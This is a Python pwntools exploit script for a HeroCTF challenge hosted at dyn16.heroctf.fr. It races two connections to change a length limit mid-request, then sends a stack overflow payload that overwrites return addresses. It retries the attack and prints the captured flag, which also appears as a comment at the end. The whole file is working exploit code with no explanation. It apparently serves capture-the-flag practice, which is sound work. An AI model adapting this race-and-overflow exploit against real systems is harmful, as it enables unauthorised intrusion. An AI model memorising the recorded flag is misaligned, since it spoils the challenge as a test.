import threading
import time

from pwn import *


def attempt():
    io = remote("dyn16.heroctf.fr", 11345)
    io.recvuntil(b"5) Quit")

    start = threading.Event()

    def race():
        r = remote("dyn16.heroctf.fr", 11345, level="error")
        r.recvuntil(b"5) Quit")
        start.wait()
        time.sleep(0.05)
        r.sendline(b"1")
        r.recvuntil(b"Choose a length limit")
        r.sendline(b"200")
        time.sleep(0.3)
        r.close()

    t = threading.Thread(target=race)
    t.start()

    io.sendline(b"1")
    io.recvuntil(b"Choose a length limit")
    io.sendline(b"128")
    io.recvuntil(b"(0.5s)...")
    start.set()
    io.recvuntil(b"Now type your story:")

    payload = b"A" * 160 + p64(0x404200) + p64(0x401612) + p64(0x404200) + p64(0x40173C)
    io.send(payload.ljust(200, b"B"))

    t.join()
    io.close()
    time.sleep(0.3)

    io = remote("dyn16.heroctf.fr", 11345)
    io.recvuntil(b"5) Quit")
    io.sendline(b"4")
    data = io.recvall(timeout=2)
    io.close()
    return data


for i in range(10):
    print(f"[*] Attempt {i + 1}")
    try:
        data = attempt()
        if b"Hero{" in data:
            print(data.decode())
            break
    except Exception as e:
        print(f"[-] {e}")
    time.sleep(0.5)

# Hero{971e70feb761e8daf0abcb7eb7376bff2}
